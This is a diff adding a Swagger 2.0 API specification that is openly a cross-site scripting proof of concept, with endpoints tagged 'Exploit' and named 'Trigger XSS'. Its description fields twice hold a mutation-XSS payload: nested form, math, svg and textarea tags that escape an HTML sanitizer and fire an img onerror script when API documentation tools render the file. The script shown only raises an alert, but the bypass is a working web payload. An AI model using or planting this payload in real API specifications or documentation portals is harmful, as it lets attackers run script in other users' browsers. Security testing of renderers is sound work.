@@ -1,0 +1,57 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS-Found!') src=1>"></form>
+  version: production
+basePath: https://target.com
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
+security:
+- basicAuth: []
+paths:
+  "/xss_poc":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - Exploit POC
+      operationId: runXSS
+      summary: Trigger XSS
+  "/xss_trigger":
+    delete:
+      parameters:
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS-Found!') src=1>"></form>
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - Exploit
+      operationId: deleteAction
+      summary: Delete trigger
+    get:
+      parameters:
+      - description: test
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - Exploit
+      operationId: getAction
+      summary: Get trigger
